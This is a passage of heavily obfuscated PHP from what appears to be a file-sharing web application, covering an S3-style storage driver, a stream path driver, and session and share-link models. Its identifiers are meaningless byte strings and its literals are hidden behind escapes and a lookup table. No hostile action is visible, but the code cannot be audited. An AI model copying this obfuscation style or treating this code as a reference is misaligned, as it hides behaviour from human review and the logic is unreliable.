"\74\x50\x61\x72\164\x4e\x75\155\142\x65\x72\76{$™³àÉ­[$ÔíÜ¥úë[1409]]}\74\x2f\120\141\162\164\x4e\x75\x6d\142\x65\x72\76\12" . "\74\x45\124\x61\147\76{$™³àÉ­[$ÔíÜ¥úë[1410]]}\74\x2f\x45\124\141\x67\76\12" . $ÔíÜ¥úë[1456]; } $ıËãÕ¿¿ .= $ÔíÜ¥úë[1457]; $€—äªº = array(); $Î‹øğ­ò = explode($ÔíÜ¥úë[193], $this->getHost()); $İÙ–ıÊŞ = array($ÔíÜ¥úë[1451] => $Î‹øğ­ò[1], $ÔíÜ¥úë[225] => $ÔíÜ¥úë[130], $ÔíÜ¥úë[1364] => strlen($ıËãÕ¿¿)); $˜ôºÊªÈ = $ÔíÜ¥úë[236]; $ü’ØŠ‰• = $ÔíÜ¥úë[18] . $this->pathEncode($µáŸ¬Ü) . $öï›Ù—[$ÔíÜ¥úë[184]]; $×¡—œ– = $this->client->__getSignatureV4($€—äªº, $İÙ–ıÊŞ, $˜ôºÊªÈ, $ü’ØŠ‰•, $ıËãÕ¿¿); return array($ÔíÜ¥úë[243] => $×¡—œ–[$ÔíÜ¥úë[243]], $ÔíÜ¥úë[234] => $×¡—œ–[$ÔíÜ¥úë[1453]], $ÔíÜ¥úë[245] => $ŸŠíÄ, $ÔíÜ¥úë[1450] => $×¡—œ–[$ÔíÜ¥úë[1450]]); } public function link($±êó‰°ê, $ú¦¿·² = array()) { return parent::link($±êó‰°ê, $ú¦¿·²); } public function fileOut($ãÆ€Ã§Î, $üÇËÙ€£ = false, $Î–ì«Šì = false, $½ş•¼ È = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹Û¹Æ€][1458])) { return parent::fileOutServer($ãÆ€Ã§Î, $üÇËÙ€£, $Î–ì«Šì, $½ş•¼ È); } parent::fileOut($ãÆ€Ã§Î, $üÇËÙ€£, $Î–ì«Šì, $½ş•¼ È); } public function fileOutImage($¢º€´ä, $ŒøèªœŞ = 250) { if (strstr($this->endpoint, $_SERVER[¹Û¹Æ€][1458])) { return parent::fileOutImageServer($¢º€´ä, $ŒøèªœŞ); } parent::fileOutImage($¢º€´ä, $ŒøèªœŞ); } public function fileOutLink($õöà¤Éƒ) { $µöáïáÊ =& $_SERVER[¹Û¹Æ€]; if (substr($õöà¤Éƒ, 0, 7) == $µöáïáÊ[1331]) { $õöà¤Éƒ = $µöáïáÊ[1332] . substr($õöà¤Éƒ, 7); } header($µöáïáÊ[171] . $õöà¤Éƒ); die; } public function getHost() { $É€Ü§ëÚ =& $_SERVER[¹Û¹Æ€]; $ù¥­®™• = str_rtrim(parent::getHost(), $É€Ü§ëÚ[18] . $this->bucket); $ù¥­®™• = explode($É€Ü§ëÚ[193], $ù¥­®™•); return $ù¥­®™•[0] . $É€Ü§ëÚ[193] . $this->bucket . $É€Ü§ëÚ[20] . $ù¥­®™•[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($÷ûïªˆ×, $ÌŞÒŸà = 0) { parent::__construct(); $this->source = $÷ûïªˆ×; $this->sourceSize = $ÌŞÒŸà; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Æœ€ô¹İ = false) { return $this->sourceSize; } public function getContent($ Êİôñ = false) { return $this->fileSubstr($ Êİôñ, 0, $this->sourceSize); } public function fileSubstr($û¹ƒõ¤ˆ = false, $³¡—–şç = 0, $¡ÄèæĞÊ = 0) { if (!$¡ÄèæĞÊ) { $¡ÄèæĞÊ = $this->sourceSize; } $áï´˜ÊÓ = $this->sourceSize - $³¡—–şç; if ($¡ÄèæĞÊ >= $áï´˜ÊÓ) { $¡ÄèæĞÊ = $áï´˜ÊÓ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $³¡—–şç, $¡ÄèæĞÊ); } if ($this->sourceType == self::TYPE_FILE) { if ($¡ÄèæĞÊ <= 0) { return $_SERVER[¹Û¹Æ€][22]; } $õüô‰· = ftell($this->source); fseek_64($this->source, $õüô‰· + $³¡—–şç); $¡º€Á¼ª = @fread($this->source, $¡ÄèæĞÊ); fseek_64($this->source, $õüô‰·); return $¡º€Á¼ª; } } public function hashMd5($—ÒÕ‹Õ› = false) { return md5($this->getContent()); } public static function hash($»Š­øÇÄ, $ ßåÓÂ = 0) { $æÉ‚¸ô² = new PathDriverStream($»Š­øÇÄ, $ ßåÓÂ); return $æÉ‚¸ô²->hashSimple($»Š­øÇÄ); } public static function md5($ıŸô¬¯î, $à²°¡“é = 0) { $˜¨Æ•å— = new PathDriverStream($ıŸô¬¯î, $à²°¡“é); return $˜¨Æ•å—->hashMd5($ıŸô¬¯î); } } goto BÓÍ±ó«§¨; bÁ«¬–ÊÌé: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\155\137\x73\x65\163\163\x69\157\x6e"; public function get($¼î¡¿­Ú) { $¡Ã»Àüƒ =& $_SERVER[¹Û¹Æ€]; $œ¶ßİ«’ = $this->where(array($¡Ã»Àüƒ[1984] => $¼î¡¿­Ú))->find(); if (!is_array($œ¶ßİ«’)) { return !1; } return $œ¶ßİ«’[$¡Ã»Àüƒ[753]]; } public function set($ËÆ«„€³, $¶Ø µ¥Á, $ÁáÙ²… = 3600) { $î‡„ñÍ‰ =& $_SERVER[¹Û¹Æ€]; $Ø¦÷æ…Â = array($î‡„ñÍ‰[1984] => $ËÆ«„€³, $î‡„ñÍ‰[1888] => $¶Ø µ¥Á, $î‡„ñÍ‰[1985] => $ÁáÙ²… + time()); if (Session::get($î‡„ñÍ‰[1986])) { $Ø¦÷æ…Â[$î‡„ñÍ‰[1659]] = Session::get($î‡„ñÍ‰[1986]); } else { $Ø¦÷æ…Â[$î‡„ñÍ‰[1659]] = 0; } if ($this->get($ËÆ«„€³)) { return $this->where(array($î‡„ñÍ‰[1984] => $ËÆ«„€³))->save($Ø¦÷æ…Â); } else { return $this->add($Ø¦÷æ…Â, array(), !0); } } public function remove($ÔŒå©Ö‚) { return $this->where(array($_SERVER[¹Û¹Æ€][1984] => $ÔŒå©Ö‚))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹Û¹Æ€][1987] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\145"; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\145\162\x74\54\165\160\x64\141\x74\x65", "\x66\x75\156\x63\x74\x69\x6f\156"), array("\143\162\145\x61\x74\x65\124\x69\x6d\x65", "\x74\x69\155\x65", "\x69\156\163\x65\162\x74", "\146\165\x6e\x63\164\x69\157\156"), array("\157\x70\164\x69\157\156\x73", '', "\151\156\163\145\x72\164\54\165\160\x64\141\x74\x65\x2c\163\x65\154\x65\143\x74", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ßîˆ¿—Â) { $Æşµ½½ =& $_SERVER[¹Û¹Æ€]; $ÒòÀÖÄÌ = isset($ßîˆ¿—Â[0]) ? $ßîˆ¿—Â[0] : !1; return array($Æşµ½½[1988] => array(USER_ID, $Æşµ½½[1989]), $Æşµ½½[1929] => array($ÒòÀÖÄÌ, $Æşµ½½[1990])); } protected function listSimple() { $áæ”‹Ùü = array($_SERVER[¹Û¹Æ€][1659] => USER_ID); $è£•êı‡ = $this->field($this->fieldList)->where($áæ”‹Ùü)->select(); return $è£•êı‡ ? $è£•êı‡ : array(); } protected function getInfo($„í¾Ëë, $ŸÛà¡ğ = false) { $ÑŸ¬¡ˆ° =& $_SERVER[¹Û¹Æ€]; if ($ŸÛà¡ğ) { return $this->_getShareInfo(array($ÑŸ¬¡ˆ°[498] => $„í¾Ëë)); } $Ø¡­ûŞÖ = $this->cacheFunctionGet($ÑŸ¬¡ˆ°[1931], $„í¾Ëë); return $Ø¡­ûŞÖ; } public function getInfoByHash($à¤£­Š³) { return $this->_getShareInfo(array($_SERVER[¹Û¹Æ€][500] => $à¤£­Š³)); } public function getInfoByPath($´‹ûãİ) { $ËË±¯¢ú =& $_SERVER[¹Û¹Æ€]; $¹õÅí´ = array($ËË±¯¢ú[1659] => USER_ID, $ËË±¯¢ú[411] => $´‹ûãİ); return $this->_getShareInfo($¹õÅí´); } public function getInfoBySourcePath($æé’ô) { $¯ìßĞàŠ =& $_SERVER[¹Û¹Æ€]; $Á­êºû = array($¯ìßĞàŠ[1659] => USER_ID, $¯ìßĞàŠ[1173] => $æé’ô); return $this->_getShareInfo($Á­êºû); } private function _getShareInfo($ğ¹™‘Ÿ) { $øâ—˜Îò =& $_SERVER[¹Û¹Æ€]; $ßî–­«î = $this->where($ğ¹™‘Ÿ)->find(); if (!$ßî–­«î) { return !1; } $ğ¹™‘Ÿ = array($øâ—˜Îò[498] => $ßî–­«î[$øâ—˜Îò[498]]); $Ú‚˜Ñ¥± = $øâ—˜Îò[1991]; $“úƒëöÔ = Model($øâ—˜Îò[611])->order($øâ—˜Îò[408])->field($Ú‚˜Ñ¥±)->where($ğ¹™‘Ÿ)->select(); if ($ßî–­«î[$øâ—˜Îò[411]] == $øâ—˜Îò[207]) { $ßî–­«î[$øâ—˜Îò[96]] = IO::info($ßî–­«î[$øâ—˜Îò[1173]]); } else { $ßî–­«î[$øâ—˜Îò[96]] = Model($øâ—˜Îò[1333])->pathInfo($ßî–­«î[$øâ—˜Îò[411]]); } $ßî–­«î[$øâ—˜Îò[1992]] = $“úƒëöÔ; return $ßî–­«î; } protected function getInfoAuth($ÛµÀ¬”) { $£ÅÉâµ =& $_SERVER[¹Û¹Æ€]; $®™¼õ›» = $this->getInfo($ÛµÀ¬”); if ($®™¼õ›»[$£ÅÉâµ[1659]] == USER_ID) { $®™¼õ›»[$£ÅÉâµ[422]] = $®™¼õ›»[$£ÅÉâµ[96]][$£ÅÉâµ[422]]; } else { $®™¼õ›»[$£ÅÉâµ[422]] = Model($£ÅÉâµ[511])->authMake($®™¼õ›»[$£ÅÉâµ[1992]]); } return $®™¼õ›»; } protected function listData($™şµ÷û = null, $µ˜†â÷Â = 300) { $Šöİ¨×ˆ =& $_SERVER[¹Û¹Æ€]; $–‚’Ö½§ = array(array($Šöİ¨×ˆ[503] => array($Šöİ¨×ˆ[1009], 0), $Šöİ¨×ˆ[505] => array($Šöİ¨×ˆ[1009], 0), $Šöİ¨×ˆ[1993] => $Šöİ¨×ˆ[1947])); if ($™şµ÷û == $Šöİ¨×ˆ[1994]) { $–‚’Ö½§ = array($Šöİ¨×ˆ[503] => 1); } else { if ($™şµ÷û == $Šöİ¨×ˆ[1158]) { $–‚’Ö½§ = array($Šöİ¨×ˆ[505] => 1); } } $–‚’Ö½§[$Šöİ¨×ˆ[1659]] = USER_ID; $£ñ®²‚ = $this->where($–‚’Ö½§)->selectPage($µ˜†â÷Â); return $£ñ®²‚; } protected function listToMe($ÊÀèöŠ = 300) { $™ºåˆò¸ =& $_SERVER[¹Û¹Æ€]; $´«Ï›Ô± = Model($™ºåˆò¸[1995])->userGroupParents(USER_ID); $ù¯ÏİÅ = array($™ºåˆò¸[595] => SourceModel::TYPE_USER, $™ºåˆò¸[514] => USER_ID); if ($´«Ï›Ô±) { $ù¯ÏİÅ = array(array($™ºåˆò¸[595] => SourceModel::TYPE_USER, $™ºåˆò¸[514] => USER_ID), array($™ºåˆò¸[595] => SourceModel::TYPE_GROUP, $™ºåˆò¸[514] => array($™ºåˆò¸[17], $´«Ï›Ô±)), $™ºåˆò¸[1993] => $™ºåˆò¸[1947]); } $ãÏ¡Ø½· = Model($™ºåˆò¸[611])->where($ù¯ÏİÅ)->selectPage($ÊÀèöŠ); $ÙË«‚¿ = array_to_keyvalue_group($ãÏ¡Ø½·[$™ºåˆò¸[378]], $™ºåˆò¸[498]); if (!$ÙË«‚¿) { return $ãÏ¡Ø½·; } $ÌÄ–‹Ï» = $™ºåˆò¸[1996]; $ù¯ÏİÅ = array($™ºåˆò¸[498] => array($™ºåˆò¸[427], array_keys($ÙË«‚¿)), $™ºåˆò¸[1659] => array($™ºåˆò¸[1011], $™ºåˆò¸[207])); $’ÕÉæş¶ = $this->field($ÌÄ–‹Ï»)->where($ù¯ÏİÅ)->select(); foreach ($’ÕÉæş¶ as $áúâêÆ¾ => &$ğğé«¯õ) { $ğğé«¯õ[$™ºåˆò¸[1992]] = $ÙË«‚¿[$ğğé«¯õ[$™ºåˆò¸[498]]]; } unset($ğğé«¯õ); $¼èÀÙĞ‘ = array($™ºåˆò¸[1997] => $’ÕÉæş¶, $™ºåˆò¸[1998] => $ãÏ¡Ø½·[$™ºåˆò¸[375]]); return $¼èÀÙĞ‘; } protected function shareAdd($½Ë†¶¼, $µºÛ¬¦Ÿ) { $Å˜»ÜÉƒ =& $_SERVER[¹Û¹Æ€]; $Ğ¸ŒÊ¸ä = $this->_addShareData($½Ë†¶¼, $µºÛ¬¦Ÿ); if (!empty($µºÛ¬¦Ÿ[$Å˜»ÜÉƒ[1999]])) { $this->_shareAuthSet($Ğ¸ŒÊ¸ä, $µºÛ¬¦Ÿ[$Å˜»ÜÉƒ[1999]]); } $this->shareEventAdd($½Ë†¶¼, $µºÛ¬¦Ÿ, $Å˜»ÜÉƒ[1161]); return $Ğ¸ŒÊ¸ä; } protected function shareAddSystem($Œº·à•, $öÕĞÈ’) { $¶ÁıÖ¶ó =& $_SERVER[¹Û¹Æ€]; $…ò­­À¡ = $this->_addShareData($Œº·à•, $öÕĞÈ’, $¶ÁıÖ¶ó[1282]); $this->_shareAuthSet($…ò­­À¡, $öÕĞÈ’[$¶ÁıÖ¶ó[1999]]); return $…ò­­À¡; } private function shareEventAdd($ëÇİ¯×ô, $é®‡ÔÙ, $†Ø¡¤‡ä = "\x61\144\144") { $èó§ŞÈö =& $_SERVER[¹Û¹Æ€]; if (!$ëÇİ¯×ô || $ëÇİ¯×ô == $èó§ŞÈö[207]) { return; } if ($†Ø¡¤‡ä == $èó§ŞÈö[1161]) { if ($é®‡ÔÙ[$èó§ŞÈö[503]] == $èó§ŞÈö[98]) { Model($èó§ŞÈö[579])->eventShare($ëÇİ¯×ô, $èó§ŞÈö[2000]); } if ($é®‡ÔÙ[$èó§ŞÈö[505]] == $èó§ŞÈö[98]) { Model($èó§ŞÈö[579])->eventShare($ëÇİ¯×ô, $èó§ŞÈö[2001]); } return; } $ëÌıÙÂÇ = $this->getInfoByPath($ëÇİ¯×ô); $ÑÚÉğŸë = $èó§ŞÈö[2002]; if ($ëÌıÙÂÇ[$èó§ŞÈö[503]] == $èó§ŞÈö[207] && $é®‡ÔÙ[$èó§ŞÈö[503]] == $èó§ŞÈö[98]) { $ÑÚÉğŸë = $èó§ŞÈö[2000]; } if ($ëÌıÙÂÇ[$èó§ŞÈö[503]] == $èó§ŞÈö[98] && $é®‡ÔÙ[$èó§ŞÈö[503]] == $èó§ŞÈö[207]) { $ÑÚÉğŸë = $èó§ŞÈö[2003]; } if ($ëÌıÙÂÇ[$èó§ŞÈö[505]] == $èó§ŞÈö[207] && $é®‡ÔÙ[$èó§ŞÈö[505]] == $èó§ŞÈö[98]) { $ÑÚÉğŸë = $èó§ŞÈö[2001]; } if ($ëÌıÙÂÇ[$èó§ŞÈö[505]] == $èó§ŞÈö[98] && $é®‡ÔÙ[$èó§ŞÈö[505]] == $èó§ŞÈö[207]) { $ÑÚÉğŸë = $èó§ŞÈö[2004]; } Model($èó§ŞÈö[579])->eventShare($ëÇİ¯×ô, $ÑÚÉğŸë); return; } private function _addShareData($ˆ°Ÿä, $Ğ¥ìË¤Ğ = array(), $¬İÆåºŒ = false) { $íâÉçÌ =& $_SERVER[¹Û¹Æ€]; $¶ÃõŸş = $¬İÆåºŒ == $íâÉçÌ[1282] ? 0 : USER_ID; $³—§åŞ– = array($íâÉçÌ[426] => $ˆ°Ÿä, $íâÉçÌ[1650] => $¶ÃõŸş); if ($ˆ°Ÿä == 0) { $³—§åŞ– = array($íâÉçÌ[2005] => $Ğ¥ìË¤Ğ[$íâÉçÌ[1173]], $íâÉçÌ[1650] => $¶ÃõŸş); } if ($‹á¦·Ãæ = $this->where($³—§åŞ–)->find()) { return $‹á¦·Ãæ[$íâÉçÌ[498]]; } if ($ˆ°Ÿä == 0) { $®ıàìÊÙ = array($íâÉçÌ[42] => get_path_this($Ğ¥ìË¤Ğ[$íâÉçÌ[94]])); } else { $®ıàìÊÙ = Model($íâÉçÌ[823])->sourceInfo($ˆ°Ÿä); if (!$®ıàìÊÙ) { return !1; } } if (!$Ğ¥ìË¤Ğ[$íâÉçÌ[1559]]) { $Ğ¥ìË¤Ğ[$íâÉçÌ[1559]] = $®ıàìÊÙ[$íâÉçÌ[42]]; } $¼Å°ë°  = array($íâÉçÌ[1650] => $¶ÃõŸş, $íâÉçÌ[426] => $ˆ°Ÿä, $íâÉçÌ[1559] => $íâÉçÌ[22], $íâÉçÌ[503] => 0, $íâÉçÌ[505] => 0, $íâÉçÌ[1173] => $íâÉçÌ[22], $íâÉçÌ[316] => $íâÉçÌ[22], $íâÉçÌ[886] => $íâÉçÌ[22], $íâÉçÌ[2006] => 0, $íâÉçÌ[2007] => 0, $íâÉçÌ[506] => 0, $íâÉçÌ[507] => $íâÉçÌ[22], $íâÉçÌ[500] => $íâÉçÌ[22]); $õï±¿§Ô = explode($íâÉçÌ[60], $íâÉçÌ[2008]); foreach ($õï±¿§Ô as $Ë–‘şì) { if (!isset($Ğ¥ìË¤Ğ[$Ë–‘şì])) { continue; } $¼Å°ë° [$Ë–‘şì] = $Ğ¥ìË¤Ğ[$Ë–‘şì]; } $¹„›°¸Í = $this->add($¼Å°ë° ); $©…Ú°‡ö = array($íâÉçÌ[500] => short_id($¹„›°¸Í)); $this->where(array($íâÉçÌ[497] => $¹„›°¸Í))->save($©…Ú°‡ö); return $¹„›°¸Í; } private function _shareAuthSet($‰ ˜ïß, $óİòÒ») { $ŸÖ–¾‚Š =& $_SERVER[¹Û¹Æ€]; if (!is_array($óİòÒ»)) { return !1; } $¥·œ«« = Model($ŸÖ–¾‚Š[1957]); $¥·œ««->where(array($ŸÖ–¾‚Š[498] => $‰ ˜ïß))->delete(); $Ô™¡ßË· = array(); foreach ($óİòÒ» as $ •åŸ¸ù) { $á›÷¨µÀ = SourceModel::TYPE_USER; if ($ •åŸ¸ù[$ŸÖ–¾‚Š[420]] == SourceModel::TYPE_GROUP) { $á›÷¨µÀ = SourceModel::TYPE_GROUP; } $ò·Ä³éÎ = array($ŸÖ–¾‚Š[498] => $‰ ˜ïß, $ŸÖ–¾‚Š[420] => $á›÷¨µÀ, $ŸÖ–¾‚Š[514] => intval($ •åŸ¸ù[$ŸÖ–¾‚Š[514]]), $ŸÖ–¾‚Š[1953] => 0, $ŸÖ–¾‚Š[2009] => -1); if ($ •åŸ¸ù[$ŸÖ–¾‚Š[1953]]) { $ò·Ä³éÎ[$ŸÖ–¾‚Š[1953]] = $ •åŸ¸ù[$ŸÖ–¾‚Š[1953]]; } else { if ($ •åŸ¸ù[$ŸÖ–¾‚Š[2009]]) { $ò·Ä³éÎ[$ŸÖ–¾‚Š[2009]] = $ •åŸ¸ù[$ŸÖ–¾‚Š[2009]]; } } $Ô™¡ßË·[] = $ò·Ä³éÎ; } return $¥·œ««->addAll($Ô™¡ßË·, array(), !0); } public function numViewAdd($º˜Í£‹°) { $ìœÙ–ÕÑ =& $_SERVER[¹Û¹Æ€]; $ŞœÈî²Î = array($ìœÙ–ÕÑ[497] => $º˜Í£‹°); $this->where($ŞœÈî²Î)->setAdd($ìœÙ–ÕÑ[2006]); } public function numDownloadAdd($æÁŞÂà) { $Æñ ß·¢ =& $_SERVER[¹Û¹Æ€]; $–˜ı†Ü = array($Æñ ß·¢[497] => $æÁŞÂà); $this->where($–˜ı†Ü)->setAdd($Æñ ß·¢[2007]); } protected function shareEdit($÷×Â«À”, $¸àÁñ±œ) { $‰Á™Ò¦â =& $_SERVER[¹Û¹Æ€]; $ÅÕóİí = $this->getInfo($÷×Â«À”); if (!$ÅÕóİí) { return !1; } $this->_checkLinkShare($¸àÁñ±œ, $ÅÕóİí); $ÒùÔÑôÒ = array(); $ÆşË‘À = explode($‰Á™Ò¦â[60], $‰Á™Ò¦â[2010]); foreach ($ÆşË‘À as $“……ØÆ¾) { if (!array_key_exists($“……ØÆ¾, $¸àÁñ±œ)) { continue; } $ÒùÔÑôÒ[$“……ØÆ¾] = $¸àÁñ±œ[$“……ØÆ¾]; } $this->shareEventAdd($ÅÕóİí[$‰Á™Ò¦â[411]], $¸àÁñ±œ, $‰Á™Ò¦â[1819]); $this->where(array($‰Á™Ò¦â[497] => $÷×Â«À”))->save($ÒùÔÑôÒ); if (isset($¸àÁñ±œ[$‰Á™Ò¦â[1999]])) { $this->_shareAuthSet($÷×Â«À”, $¸àÁñ±œ[$‰Á™Ò¦â[1999]]); } return !0; } private function _checkLinkShare($åŸèƒ‰¦, $­½«øøˆ) { $«ğ”‘ùÇ =& $_SERVER[¹Û¹Æ€]; if ($åŸèƒ‰¦[$«ğ”‘ùÇ[503]] != $«ğ”‘ùÇ[98]) { return; } $Ş¹æ¡õí = $­½«øøˆ[$«ğ”‘ùÇ[96]][$«ğ”‘ùÇ[411]]; if ($­½«øøˆ[$«ğ”‘ùÇ[96]][$«ğ”‘ùÇ[43]] != $«ğ”‘ùÇ[209]) { $İ®¥ã = $this->_folderReport($Ş¹æ¡õí); if (!$İ®¥ã) { return; } show_json(LNG($«ğ”‘ùÇ[2011]) . $«ğ”‘ùÇ[2012] . $İ®¥ã, !1); } $¿ß¢ó¸Ñ = Model($«ğ”‘ùÇ[823])->fileInfoGet($­½«øøˆ[$«ğ”‘ùÇ[96]][$«ğ”‘ùÇ[411]]); if (!$¿ß¢ó¸Ñ) { return; } $ØÌ»É« = $this->shareFileMeta($¿ß¢ó¸Ñ[$«ğ”‘ùÇ[477]]); if (isset($ØÌ»É«[$«ğ”‘ùÇ[383]]) && $ØÌ»É«[$«ğ”‘ùÇ[383]] == $«ğ”‘ùÇ[98]) { show_json(LNG($«ğ”‘ùÇ[2013]), !1); } } private function _folderReport($àÜíŒ¡) { $Ç°„‘î =& $_SERVER[¹Û¹Æ€]; $Íû‘ë©à = array($Ç°„‘î[477] => array($Ç°„‘î[1009], 0), $Ç°„‘î[748] => 3); $Óèš¢ÀĞ = Model($Ç°„‘î[2014])->where($Íû‘ë©à)->field($Ç°„‘î[477])->select(); if (!$Óèš¢ÀĞ) { return !1; } $Óèš¢ÀĞ = array_to_keyvalue($Óèš¢ÀĞ, $Ç°„‘î[22], $Ç°„‘î[477]); $µç¬î›³ = $Ç°„‘î[60] . $àÜíŒ¡ . $Ç°„‘î[60]; $Íû‘ë©à = array($Ç°„‘î[477] => array($Ç°„‘î[17], $Óèš¢ÀĞ), $Ç°„‘î[530] => array($Ç°„‘î[392], "\45{$µç¬î›³}\x25"), $Ç°„‘î[440] => 0); $ƒºÂ›Í¿ = Model($Ç°„‘î[823])->where($Íû‘ë©à)->field($Ç°„‘î[2015])->find(); if (!$ƒºÂ›Í¿) { return !1; } $ğ§òÍ³‚ = substr($ƒºÂ›Í¿[$Ç°„‘î[530]], strpos($ƒºÂ›Í¿[$Ç°„‘î[530]], $µç¬î›³)); $Íû‘ë©à = array($Ç°„‘î[411] => array($Ç°„‘î[17], trim($ğ§òÍ³‚, $Ç°„‘î[60]))); $‚ä„ò‰£ = Model($Ç°„‘î[823])->where($Íû‘ë©à)->field($Ç°„‘î[42])->select(); $Í¹¯Âİ¾ = array_to_keyvalue($‚ä„ò‰£, $Ç°„‘î[22], $Ç°„‘î[42]); $Í¹¯Âİ¾[] = $ƒºÂ›Í¿[$Ç°„‘î[42]]; return implode($Ç°„‘î[18], $Í¹¯Âİ¾); } protected function remove($µ¿™Ÿéõ) { $¥—úªäˆ =& $_SERVER[¹Û¹Æ€]; if (is_array($µ¿™Ÿéõ)) { $µ¿™Ÿéõ = array($¥—úªäˆ[17], $µ¿™Ÿéõ); } $³¦êû¯« = array($¥—úªäˆ[498] => $µ¿™Ÿéõ); $“¾¤š ± = $this->where($³¦êû¯«)->delete(); if ($“¾¤š ±) { Model($¥—úªäˆ[611])->where(array($¥—úªäˆ[498] => $µ¿™Ÿéõ))->delete(); } $€ñÕÄ¨ = is_array($µ¿™Ÿéõ) ? $µ¿™Ÿéõ[1] : array($µ¿™Ÿéõ); for ($Ö ‚Ü¢— = 0; $Ö ‚Ü¢— < count($€ñÕÄ¨); $Ö ‚Ü¢—++) { $ò—ó¬ÓÑ = $this->getInfo($€ñÕÄ¨[$Ö ‚Ü¢—]); if ($ò—ó¬ÓÑ[$¥—úªäˆ[505]] == $¥—úªäˆ[98]) { Model($¥—úªäˆ[579])->eventShare($ò—ó¬ÓÑ[$¥—úªäˆ[411]], $¥—úªäˆ[2004]); } if ($ò—ó¬ÓÑ[$¥—úªäˆ[503]] == $¥—úªäˆ[98]) { Model($¥—úªäˆ[579])->eventShare($ò—ó¬ÓÑ[$¥—úªäˆ[411]], $¥—úªäˆ[2003]); } } return $“¾¤š ±; } protected function removeBySource($¬·«¤†í) { $ª³ÙŸÉã =& $_SERVER[¹Û¹Æ€]; $ô±¢˜†° = array($ª³ÙŸÉã[426] => array($ª³ÙŸÉã[427], $¬·«¤†í)); $ø‹Ğ¸Ô¨ = $this->field($ª³ÙŸÉã[498])->where($ô±¢˜†°)->select(); $ø‹Ğ¸Ô¨ = array_to_keyvalue($ø‹Ğ¸Ô¨, $ª³ÙŸÉã[22], $ª³ÙŸÉã[498]); if (!$ø‹Ğ¸Ô¨) { return; } $ô±¢˜†° = array($ª³ÙŸÉã[497] => array($ª³ÙŸÉã[427], $ø‹Ğ¸Ô¨)); $this->where($ô±¢˜†°)->delete(); Model($ª³ÙŸÉã[611])->where($ô±¢˜†°)->delete(); } public function listAll($š¥½ÕßÁ) { $éÊ¿¶ =& $_SERVER[¹Û¹Æ€]; $ÜĞ†ê†ã = array(); if ($š¥½ÕßÁ[$éÊ¿¶[1659]]) { $ÜĞ†ê†ã[$éÊ¿¶[1659]] = $š¥½ÕßÁ[$éÊ¿¶[1659]]; } if ($š¥½ÕßÁ[$éÊ¿¶[759]]) { $íôÈÛ¢Ë = $š¥½ÕßÁ[$éÊ¿¶[506]] ? $š¥½ÕßÁ[$éÊ¿¶[506]] : strtotime(date($éÊ¿¶[2016])); $ÜĞ†ê†ã[$éÊ¿¶[210]] = array($éÊ¿¶[342], array($š¥½ÕßÁ[$éÊ¿¶[759]], $íôÈÛ¢Ë)); } if ($š¥½ÕßÁ[$éÊ¿¶[43]]) { $ÜĞ†ê†ã[$š¥½ÕßÁ[$éÊ¿¶[43]]] = 1; } else { $ÜĞ†ê†ã[] = array($éÊ¿¶[503] => array($éÊ¿¶[1009], 0), $éÊ¿¶[505] => array($éÊ¿¶[1009], 0), $éÊ¿¶[1993] => $éÊ¿¶[1947]); } if ($š¥½ÕßÁ[$éÊ¿¶[1943]]) { $ÜĞ†ê†ã[] = array($éÊ¿¶[500] => $š¥½ÕßÁ[$éÊ¿¶[1943]], $éÊ¿¶[1559] => array($éÊ¿¶[392], "\45{$š¥½ÕßÁ[$éÊ¿¶[1943]]}\x25"), $éÊ¿¶[1993] => $éÊ¿¶[1947]); } $üàÅ•ì¼ = $this->_makeOrder()->where($ÜĞ†ê†ã)->selectPage(20); if (empty($üàÅ•ì¼[$éÊ¿¶[378]])) { return array(); } $this->_listDataApply($üàÅ•ì¼[$éÊ¿¶[378]]); return $üàÅ•ì¼; } public function listDataApply($ÕÚ‡•) { $this->_listDataApply($ÕÚ‡•); return $ÕÚ‡•; } private function _listDataApply(&$¥ƒğ“Íß) { $™òƒ³° =& $_SERVER[¹Û¹Æ€]; $œ’šëÊÆ = array_to_keyvalue($¥ƒğ“Íß, $™òƒ³°[22], $™òƒ³°[1659]); $üíìÙùË = Model($™òƒ³°[544])->userListInfo(array_unique($œ’šëÊÆ)); $„ª–ŒÁì = array_to_keyvalue($¥ƒğ“Íß, $™òƒ³°[22], $™òƒ³°[411]); $³©…· = Model($™òƒ³°[823])->sourceListInfo($„ª–ŒÁì, !0); foreach ($¥ƒğ“Íß as $†¬ş©èˆ => &$ÎŠì¼Âõ) { $ıÁØ£à = $ÎŠì¼Âõ[$™òƒ³°[1659]]; $ÎŠì¼Âõ[$™òƒ³°[2017]] = $üíìÙùË[$ıÁØ£à] ? $üíìÙùË[$ıÁØ£à] : !1; $Ø˜Á¶¹Œ = $ÎŠì¼Âõ[$™òƒ³°[411]]; $ÎŠì¼Âõ[$™òƒ³°[96]] = $³©…·[$Ø˜Á¶¹Œ] ? $³©…·[$Ø˜Á¶¹Œ] : !1; if ($ÎŠì¼Âõ[$™òƒ³°[96]][$™òƒ³°[440]] == $™òƒ³°[98]) { unset($¥ƒğ“Íß[$†¬ş©èˆ]); } if ($ÎŠì¼Âõ[$™òƒ³°[96]] != $™òƒ³°[207] && !$ÎŠì¼Âõ[$™òƒ³°[96]]) { unset($¥ƒğ“Íß[$†¬ş©èˆ]); } } unset($ÎŠì¼Âõ); $¥ƒğ“Íß = array_values($¥ƒğ“Íß); } private function _makeOrder($ºø¶€€› = '') { $Ÿœ½Ü =& $_SERVER[¹Û¹Æ€]; $£úôß¯‡ = array($Ÿœ½Ü[210], $Ÿœ½Ü[506], $Ÿœ½Ü[2006], $Ÿœ½Ü[2007]); $ŠĞ‡ÅÊÇ = array($Ÿœ½Ü[459] => $Ÿœ½Ü[460], $Ÿœ½Ü[461] => $Ÿœ½Ü[462]); $§”¸“¾ = Input::get($Ÿœ½Ü[466], $Ÿœ½Ü[17], $Ÿœ½Ü[432], $£úôß¯‡); 